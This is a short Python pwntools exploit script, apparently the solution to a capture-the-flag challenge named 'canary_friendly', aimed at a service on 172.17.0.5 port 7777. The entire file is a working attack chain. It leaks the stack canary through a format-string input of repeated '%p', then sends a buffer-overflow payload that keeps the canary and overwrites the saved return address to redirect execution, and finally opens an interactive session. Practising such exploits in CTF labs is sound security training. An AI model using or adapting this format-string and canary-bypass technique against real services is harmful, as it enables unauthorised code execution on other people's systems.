#!/usr/bin/env python3

import sys
from pwn import *

# Step 1 -> Exploit the format string and leak the Canary

proc = remote("172.17.0.5", 7777)
#proc = process("/home/kali/Documents/SB/MidnightCTF/PWN/pwn/infra/4_canary_friendly/canary_friendly")

log.info(proc.recvuntil(b"?\033[0m\n\n").decode())
log.info("Exploiting format string...")

proc.sendline(b"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p %p")

leak = proc.recvuntil(b"\033[0m\n\n")#
log.info(leak)

leak = leak.decode().split("\n")[4]
canary = int(leak.split(" ")[-1], 16)

log.info("Leaked Canary    : {}".format(hex(canary)))

# Step 2 -> Exploit the buffer overflow, rewriting the canary with the same value

payload  =  b'A' * (16 + 64) # Padding (buffer[16] + name[64])
payload +=  p32(canary)      # Keep the canary unmodified
payload +=  b"junkjunk"      # Padding 
payload +=  b"sEBP"          # sEBP
payload +=  p32(0x080491c2)  # sEIP

log.info("Crafted payload : {}".format(payload))
log.info("Exploiting Buffer Overflow...")

proc.sendline(payload)
proc.interactive()
proc.close()
